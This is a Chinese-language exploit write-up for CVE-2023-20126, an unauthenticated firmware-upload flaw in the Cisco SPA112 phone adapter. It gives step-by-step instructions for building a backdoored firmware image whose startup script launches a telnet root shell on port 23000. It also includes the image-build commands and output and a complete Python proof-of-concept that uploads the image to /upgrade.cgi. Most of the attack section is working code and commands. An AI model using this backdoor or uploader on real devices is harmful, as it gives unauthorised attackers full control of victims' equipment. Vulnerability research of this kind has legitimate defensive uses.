## CVE-2023-20126

### 漏洞简述

> Cisco SPA112 2 端口电话适配器基于 **Web 的管理界面** 中存在一个漏洞，可允许 **未经身份验证** 的 **远程**
> 攻击者在受影响的设备上 **执行任意代码** 。

> 此漏洞是由于 **固件升级功能** 中 **缺少身份验证过程** 造成的。攻击者可通过 **将受影响的设备升级到** 精心设计的 **固件版本**
> 来利用此漏洞。成功利用此漏洞可使攻击者以 **完全权限** 在受影响的设备上 **执行任意代码** 。

> C **isco 尚未发布固件更新** 来解决此漏洞。没有解决此漏洞的 **变通办法** 。

### 漏洞原因

    
    
    上传固件没有验证权限  
    固件校验过于简单CRC32

### 漏洞分析

 **固件升级信息收集**

/squashfs-root# strings ./usr/sbin/httpd | grep upgrade

    
    
    check_upgrade_limit_by_fullimage  
    check_upgrade_limit  
    ctl_admin_upgrade  
    upgrade_page  
    remote_upgrade  
    upgrade.cgi*  
    Have SIP call now, not allow to upgrade  
    cannot acquire upgrade lock, another process is doing upgrade now!  
    sys_upgrade read error  
    Unknow upgrade File  
    http_upgrade  
    split fimware error, cannot upgrade:%d  
    sys_upgrade done(%d)  
    Fail: upgrade file size = %d   
    Can't upgrade from wan side  
    sys_upgrade_2  
    upgrade_flag  
    upgrade_file

IDA分析httpd文件得到固件升级执行流

    
    
    httpd文件  
    ​  
    sub_1F7AC-->sub_1E048

![image-20230727220649439](https://image.3001.net/images/20230727/1690467950_64c27e6e9ad52aaedb432.png!small)

可以看到固件升级成功前经过了check_firmware_content函数检查

![image-20230727220850782](https://image.3001.net/images/20230727/1690467965_64c27e7d1edd3ab6dff74.png!small)

查找check_firmware_content函数位置可以得到在libcyutils.so文件中

![image-20230727221139497](https://image.3001.net/images/20230727/1690467976_64c27e887a494407b06bb.png!small)

IDA分析libcyutils.so文件

    
    
    libcyutils.so文件  
    ​  
    校验函数  
    check_firmware_content  
    check_firmware_header

可以看到有俩处检查位置，跟进发现俩处检查都是crc32检查但俩次检查的位置不同

![image-20230727221507266](https://image.3001.net/images/20230727/1690467987_64c27e93a5de4a7edd904.png!small)

![image-20230727221636031](https://image.3001.net/images/20230727/1690467997_64c27e9da1150d4643474.png!small)

综上分析没有发现进行权限判断的位置，得出是未授权上传固件升级，我们只需要绕过crc32检查就可以绕过检查，上传存在后门的固件

### 环境搭建---armhf

启动qemu

    
    
    sudo tunctl -t top0 -u root  
    sudo ifconfig top0 192.168.10.1  
    sudo qemu-system-arm -M vexpress-a9 -kernel vmlinuz-3.2.0-4-vexpress -initrd initrd.img-3.2.0-4-vexpress -drive if=sd,file=debian_wheezy_armhf_standard.qcow2 -append "root=/dev/mmcblk0p2" -net nic -net tap,ifname=top0 -nographic

配置qemu--IP

    
    
    ifconfig eth0 192.168.10.2/24

上传文件到qemu

    
    
    rm -rf ~/.ssh/known_hosts  
    ​  
    scp -r squashfs-root.tar.gz root@192.168.10.2:/root  
    scp -r -oHostKeyAlgorithms=+ssh-dss squashfs-root.tar.gz root@192.168.10.2:/root

进行文件的挂载

    
    
    mount -o bind /dev ./squashfs-root/dev  
    mount -t proc /proc ./squashfs-root/proc/

挂载完成后启动shell

    
    
    chroot ./squashfs-root/ sh

创建目录和文件（在一次又一次报错中分析出来的）

    
    
    目录：/var/tmp/events  
    文件：/var/run/httpd.pid

开启httpd

    
    
    ./sbin/init_nvram  
    ./usr/sbin/httpd

nmap扫描发现80端口成功开启，但不能访问web页面

    
    
    nmap -PN IP

### 构造存在后门的固件

在etc目录下写入一个my.sh

    
    
    squashfs-root# cat ./etc/my.sh  
    #!/bin/sh  
    ​  
    sleep 30  
    ​  
    /bin/busybox-armv4tl telnetd -p 23000 -l /bin/sh  
    ​

修改etc目录下的rc.init.1文件保证my.sh文件可以运行

    
    
    squashfs-root# cat etc/rc.init.1  
    #!/bin/sh  
    #  
    # /etc/rc.init.1 , should create necessary directory and load the driver  
    # please don't access nvram here, or modfiy any other env variable code here  
    # - by wenij  
    if [ ! -d "/var/tmp/events" ]; then  
    mkdir /var/tmp/events  
    fi  
    ​  
    /etc/my.sh &

制作fs.sqfs

    
    
    $ dd if=Payton_1.4.1_SR5_101419_1250_pfmwr.bin bs=1 skip=1573256 of=fs.sqfs  
    8519680+0 records in  
    8519680+0 records out  
    8519680 bytes (8.5 MB, 8.1 MiB) copied, 20.0792 s, 424 kB/s

制作固件

    
    
    # ls  
    build.sh  CustomFW.bin squashfs-root  squashfs-root.tar.xz  
    ​  
    # cat build.sh   
    #!/bin/bash  
    ​  
    sudo FW_TOOLS/mksquashfs squashfs-root fs.sqfs -noappend -le -noI  
    sudo FW_TOOLS/mkimage -A arm -O linux -C none -T filesystem -n "cybertan_rom_bin" -c "SP2X" -d fs.sqfs -s fs.img  
    cat FW_TOOLS/kernel.img fs.img > kernel_fs.img  
    #python3 ../PaytonEditor.py create_fs_update ../Firmware/Payton_232D_1.4.1_002_282_102615_1043_pfmwr_hsfw.bin kernel_fs.img CustomFW.bin  
    #sudo rm fs.sqfs fs.img kernel_fs.img  
    ​  
    ​  
    #sudo ./build.sh   
    Parallel mksquashfs: Using 4 processors  
    Creating little endian 3.1 filesystem on fs.sqfs, block size 131072.  
    lzmadic 131072  
    [======================================================================================================================================================================\] 952/952 100%  
    Exportable Little endian filesystem, data block size 131072, compressed data, uncompressed metadata, compressed fragments, duplicates are removed  
    lzmadic 131072  
    Filesystem size 8795.72 Kbytes (8.59 Mbytes)  
    31.20% of uncompressed filesystem size (28195.83 Kbytes)  
    Inode table size 32694 bytes (31.93 Kbytes)  
    100.00% of uncompressed inode table size (32694 bytes)  
    Directory table size 19492 bytes (19.04 Kbytes)  
    100.00% of uncompressed directory table size (19492 bytes)  
    Number of duplicate files found 35  
    Number of inodes 1028  
    Number of files 795  
    Number of fragments 51  
    Number of symbolic links  149  
    Number of device nodes 0  
    Number of fifo nodes 0  
    Number of socket nodes 0  
    Number of directories 84  
    Number of uids 1  
    key (1000)  
    Number of gids 0  
    Image Name:   cybertan_rom_bin  
    Created:      Sun Feb  7 14:28:15 2106  
    Image Type:   ARM Linux Filesystem Image (uncompressed)  
    Data Size:    9007104 Bytes = 8796.00 kB = 8.59 MB  
    Load Address: 0x00000000  
    Entry Point:  0x00000000

修改PaytonEditor.py文件211行

![image-20230727153410805](https://image.3001.net/images/20230727/1690468065_64c27ee140cf308f5a9d3.png!small)

    
    
    # python3 ../PaytonEditor.py create_fs_update ../Firmware/Payton_1.4.1_SR5_101419_1250_pfmwr.bin kernel_fs.img 123.bin  
    Magic:               PAYTON  FiRmWaRe  
    Signature:           0000000000000000000000000000000000000000000000000000000000000000  
    Digest:              e27c4a6171b96933836f401917d28550   Correct: True  
    Randseq:             565067b382ebd641620bac69fcf663f0   Correct: True  
    Header size:         136 bytes  
    Modules header size: 128 bytes  
    Firmware length:     10092936 bytes  
    Version:             1.4.1  
    Modules number:      1  
    Flash type:          0x137a80  
    Slic type:           0x1eaea3a  
    ​  
    Always zeros:    00000000  
    Module Magic:    b'\xc6\xf4\xb6\xaf'  
    Module Type:     1  
    Module Instance: 0  
    Reserved 1:      b'\x00\x00'  
    Header size:     128 bytes  
    Module digest:   d9e77512d103943580d9cb9647a2c6ac     Correct: True  
    Module size:     10092544 bytes  
    Module checksum: 0x0  
    Module version:  1.0  
    Reserved 2:      52 bytes  
    Header checksum: 0xdc2     Correct: True  
    ​  
    ​  
    ​  
    ​  
    NEW firmware:  
    ​  
    Magic:               PAYTON  FiRmWaRe  
    Signature:           0000000000000000000000000000000000000000000000000000000000000000  
    Digest:              436e9a4b60e485a87da875e2679aff9c   Correct: True  
    Randseq:             98e3298f987fbd91d65352c2addde519   Correct: True  
    Header size:         136 bytes  
    Modules header size: 128 bytes  
    Firmware length:     10580360 bytes  
    Version:             1.4.1  
    Modules number:      1  
    Flash type:          0x137a80  
    Slic type:           0x1eaea3a  
    ​  
    Always zeros:    00000000  
    Module Magic:    b'\xc6\xf4\xb6\xaf'  
    Module Type:     1  
    Module Instance: 0  
    Reserved 1:      b'\x00\x00'  
    Header size:     128 bytes  
    Module digest:   1206debc4021ea8787b946f090fc8272     Correct: True  
    Module size:     10579968 bytes  
    Module checksum: 0x0  
    Module version:  1.0  
    Reserved 2:      52 bytes  
    Header checksum: 0xdba     Correct: True

 **最后得到的123.bin就是存在后门的固件**

### POC

    
    
    python3 fwupload.py http://IP BINname.bin 
    
    
    #!/usr/bin/env python3  
    import requests  
    import sys  
    ​  
    def upload_firmware(base_url, firmware):  
    data = {'submit_button': 'Upgrade', #'提交按钮': '升级'  
    'change_action': '',        #'改变动作': '',  
    'submit_type': '',          #'提交类型': '',  
    'upgradeflag': 1,           #'升级标志'：1，  
    'closeflag': 1,             #'关闭'：1，  
    'privilege_str': '',        #'特权str'：  
    'privilege_end': ''         #'特权结束'：  
    }  
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.138 Safari/537.36',  
    'Connection': 'close'}  
    files = {'file': ('fw.bin', open(firmware, 'rb'), 'application/binary')}  
    upgrade_url = f'{base_url}/upgrade.cgi'  
    try:  
    print(f'Base URL: {base_url}')          #基本网址：{base_url}  
    print(f'Upgrade URL: {upgrade_url}')    #升级网址：{upgrade_url}  
    print(f'Firmware File: {firmware}')     #固件文件：{固件}  
    print('Sending firmware update...')     #正在发送固件更新...  
    r = requests.post(upgrade_url, data=data, files=files, verify=False)  
    if "is successful" in r.text:  
    #固件升级成功。 设备最终将重新启动并运行新的固件。  
    print('Firmware upgrade successful. Device will reboot eventually and be running the new FW.')  
    else:  
    #没有获得预期的辉煌成功。 倾销回应。  
    print('Did not get the expected glorious success. Dumping response.')  
    print(r.text)  
    except Exception as e:  
    #由于我们遇到了例外，因此没有获得预期的辉煌成功。 转储异常..  
    print('Did not get the expected glorious success as we hit an exception. Dumping the exception..')  
    #注意：如果您的固件二进制文件损坏/格式错误，就会发生这种情况。 设备无论如何都会重新启动。  
    print('Note: if your firmware binary was bad/malformed, this happens. The device will reboot anyway.')  
    print(str(e))  
    ​  
    def main():  
    if len(sys.argv) != 3:  
    sys.exit(f'use: {sys.argv[0]} http://spa112.lol firmware.bin')  
    upload_firmware(sys.argv[1], sys.argv[2])  
    ​  
    if __name__ == "__main__":  
    main()

### 参考链接

<https://www.fullspectrum.dev/cisco-spa112-forever-day-cve-2023-20126/>

<https://github.com/fullspectrumdev/RancidCrisco/tree/main>

<https://software.cisco.com/download/home/283998771/type/282463187/release/1.4.1%20SR5?i=!pp>

